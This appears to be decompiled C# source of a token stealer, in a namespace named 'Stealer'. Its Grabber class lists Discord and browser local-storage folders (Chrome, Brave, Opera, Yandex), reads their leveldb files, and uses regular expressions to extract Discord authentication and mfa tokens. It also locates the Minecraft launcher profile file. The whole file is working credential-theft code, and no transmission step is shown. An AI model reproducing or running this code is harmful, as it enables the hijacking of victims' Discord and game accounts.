using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Stealer
{
	// Token: 0x0200000C RID: 12
	internal class Grabber
	{
		// Token: 0x06000034 RID: 52 RVA: 0x000037FC File Offset: 0x000019FC
		private static void Scan()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			Grabber.target.Add(folderPath + "\\Discord");
			Grabber.target.Add(folderPath + "\\discordcanary");
			Grabber.target.Add(folderPath + "\\discordptb");
			Grabber.target.Add(folderPath + "\\\\Opera Software\\Opera Stable");
			Grabber.target.Add(folderPath2 + "\\Google\\Chrome\\User Data\\Default");
			Grabber.target.Add(folderPath2 + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
			Grabber.target.Add(folderPath2 + "\\Yandex\\YandexBrowser\\User Data\\Default");
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000038AC File Offset: 0x00001AAC
		public static List<string> Grab()
		{
			Grabber.Scan();
			List<string> list = new List<string>();
			foreach (string text in Grabber.target)
			{
				if (Directory.Exists(text))
				{
					string path = text + "\\Local Storage\\leveldb";
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						foreach (FileInfo fileInfo in directoryInfo.GetFiles("*.ldb"))
						{
							string input = fileInfo.OpenText().ReadToEnd();
							foreach (object obj in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
							{
								Match match = (Match)obj;
								list.Add(match.Value);
							}
							foreach (object obj2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
							{
								Match match2 = (Match)obj2;
								list.Add(match2.Value);
							}
						}
					}
					catch
					{
					}
				}
			}
			return list;
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00003A5C File Offset: 0x00001C5C
		public static void Minecraft()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string value = folderPath + "\\.minecraft\\launcher_profiles.json";
			Console.WriteLine(value);
		}

		// Token: 0x04000034 RID: 52
		public static List<string> target = new List<string>();
	}
}
